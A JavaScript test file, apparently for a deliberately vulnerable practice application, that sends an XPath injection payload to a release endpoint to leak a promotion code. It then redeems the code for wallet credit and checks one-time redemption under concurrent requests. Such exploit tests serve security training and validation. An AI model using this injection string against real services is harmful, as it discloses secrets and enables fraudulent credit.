require('dotenv').config();
const assert = require('assert');
const request = require('supertest')(require('./helpers/base-url'));

describe('XPath disclosure of an operational promotion', function () {
  async function createAccount(username) {
    const password = 'Promotion123!';
    assert.strictEqual((await request.post('/api/v2/users').send({ username, password })).status, 201);
    const login = await request.post('/api/v2/login').send({ username, password });
    assert.strictEqual(login.status, 200);
    return { Authorization: `Bearer ${login.body.token}` };
  }

  it('leaks the live code through XPath and changes persisted wallet credit exactly once per account', async function () {
    const suffix = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
    const alice = await createAccount(`xpath-alice-${suffix}`);
    const bob = await createAccount(`xpath-bob-${suffix}`);

    const ordinary = await request.get('/api/v2/release/0.0.1');
    assert.strictEqual(ordinary.status, 200);
    assert.match(ordinary.text, /<release>0\.0\.1<\/release>/);
    assert.doesNotMatch(ordinary.text, /<code>/);

    const payload = encodeURIComponent("0.0.1' or 1=1 or 'a'='a");
    const injected = await request.get(`/api/v2/release/${payload}`);
    assert.strictEqual(injected.status, 200);
    const code = /<code>([^<]+)<\/code>/.exec(injected.text)?.[1];
    assert.ok(code, 'XPath result should reveal the operational promotion code');
    const spec = await request.get('/openAPI-spec.json');
    assert.strictEqual(spec.status, 200);
    assert.ok(spec.body.paths['/v2/resource-store/promotions/redeem']?.post);

    const initial = await request.get('/api/v2/resource-store').set(alice);
    assert.strictEqual(initial.body.balance, 100);
    assert.strictEqual((await request.post('/api/v2/resource-store/promotions/redeem').send({ code })).status, 401);
    assert.strictEqual((await request.post('/api/v2/resource-store/promotions/redeem').set(alice)
      .send({ code: 'unknown-code' })).status, 404);

    const redeemed = await request.post('/api/v2/resource-store/promotions/redeem').set(alice).send({ code });
    assert.strictEqual(redeemed.status, 200);
    assert.ok(redeemed.body.credits > 0);
    assert.strictEqual(redeemed.body.balance, initial.body.balance + redeemed.body.credits);
    assert.strictEqual(redeemed.body.redemption.code, code);
    const persisted = await request.get('/api/v2/resource-store').set(alice);
    assert.strictEqual(persisted.body.balance, redeemed.body.balance);
    assert.strictEqual(persisted.body.redemptions.filter((entry) => entry.code === code).length, 1);
    assert.strictEqual((await request.post('/api/v2/resource-store/promotions/redeem').set(alice)
      .send({ code })).status, 409);

    const concurrent = await Promise.all([
      request.post('/api/v2/resource-store/promotions/redeem').set(bob).send({ code }),
      request.post('/api/v2/resource-store/promotions/redeem').set(bob).send({ code })
    ]);
    assert.deepStrictEqual(concurrent.map((response) => response.status).sort(), [200, 409]);
    const bobStore = await request.get('/api/v2/resource-store').set(bob);
    assert.strictEqual(bobStore.body.balance, 100 + redeemed.body.credits);
    assert.strictEqual(bobStore.body.redemptions.filter((entry) => entry.code === code).length, 1);
  });
});
